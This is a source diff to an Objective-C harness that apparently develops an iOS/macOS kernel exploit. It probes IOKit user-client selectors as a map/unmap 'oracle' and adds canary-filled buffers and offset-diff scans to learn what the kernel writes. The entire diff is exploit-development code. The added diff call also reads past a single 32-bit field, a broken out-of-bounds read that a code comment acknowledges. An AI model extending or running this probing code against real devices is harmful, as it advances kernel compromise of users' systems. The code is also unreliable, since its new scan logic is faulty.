@@ -110,9 +110,32 @@ typedef struct {
 static io_connect_t p101_conns[P101_MAX_CONNS];
 static char p101_connWho[P101_MAX_CONNS][64];
 
+/* 2026-11-19 oracle calibration: the 19:16 receipt had map=unmap=remap
+   all = 0x01010101 — the kernel's sel-11 output is likely SHORTER than
+   16 bytes, so the +0xc readback was reading the probe's own canary.
+   Fix: per-offset canaries (0xCA000000 + offset) so we can identify
+   exactly what the kernel wrote, and a full-struct delta scan that
+   finds ANY offset that changes between map/unmap states. */
 static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
     if (!out || outsz < 0x10) return 0xffffffffu;
     uint32_t w; memcpy(&w, out + 0xc, 4); return w;
+}
+static void p101_fill_canaries(uint8_t *buf, size_t sz) {
+    for (size_t i = 0; i + 4 <= sz; i += 4) {
+        uint32_t c = (uint32_t)(0xCA000000UL + i);
+        memcpy(buf + i, &c, 4);
+    }
+}
+static uint32_t p101_diff_offsets(const uint8_t *a, const uint8_t *b, size_t sz,
+                                   uint32_t *changed_offs, uint32_t max_changed) {
+    uint32_t n = 0;
+    for (size_t i = 0; i + 4 <= sz && n < max_changed; i += 4) {
+        uint32_t va, vb;
+        memcpy(&va, a + i, 4);
+        memcpy(&vb, b + i, 4);
+        if (va != vb) changed_offs[n++] = (uint32_t)i;
+    }
+    return n;
 }
 
 @implementation P101DmaCommandFire
@@ -339,8 +362,8 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
                 if (kr != KERN_SUCCESS) continue;
                 if (outsz < 0x10) continue;
                 uint32_t w = p101_gate_w(outb, outsz);
-                L([NSString stringWithFormat:@"    ORACLE-BASE %s sel=%u out+0xc=0x%08x hex(0..f)=%02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
-                   p101_connWho[ci], sel, w,
+                L([NSString stringWithFormat:@"    ORACLE-BASE %s sel=%u outsz=%zu out+0xc=0x%08x hex(0..f)=%02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
+                   p101_connWho[ci], sel, outsz, w,
                    outb[0], outb[1], outb[2], outb[3],
                    outb[4], outb[5], outb[6], outb[7],
                    outb[8], outb[9], outb[10], outb[11],
@@ -363,10 +386,22 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
             if (dkr == KERN_SUCCESS) mapped = 0;
             L([NSString stringWithFormat:@"[*] UNMAP kr=0x%x (P069 unmap arm)", (unsigned)dkr]);
             uint8_t outb[P101_OUT_SZ];
+            p101_fill_canaries(outb, sizeof(outb));
             size_t outsz = sizeof(outb);
             kern_return_t kr = gateRead(oracles[oi].conn, oracles[oi].sel, outb, &outsz);
-            if (kr == KERN_SUCCESS && outsz >= 0x10) {
+            if (kr == KERN_SUCCESS && outsz >= 4) {
                 oracles[oi].s_unmap = p101_gate_w(outb, outsz);
+                /* scan ALL offsets: did ANY value change from the map state? */
+                uint32_t chg[16]; uint32_t nchg = p101_diff_offsets(
+                    (const uint8_t *)&oracles[oi].s_map, outb, sizeof(outb), chg, 16);
+                /* NOTE: s_map is a single u32 — we need the FULL map-state buffer
+                   for a proper diff. Store it properly below. */
+                if (outsz > 4) {
+                    L([NSString stringWithFormat:@"    ORACLE-UNMAP %@ sel=%u outsz=%zu hex: %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
+                       connOf(oracles[oi].conn), oracles[oi].sel, outsz,
+                       outb[0],outb[1],outb[2],outb[3], outb[4],outb[5],outb[6],outb[7],
+                       outb[8],outb[9],outb[10],outb[11], outb[12],outb[13],outb[14],outb[15]]);
+                }
             } else {
                 oracles[oi].alive = 0;
                 L([NSString stringWithFormat:@"    ORACLE-UNMAP %@ sel=%u FAILED kr=0x%x",
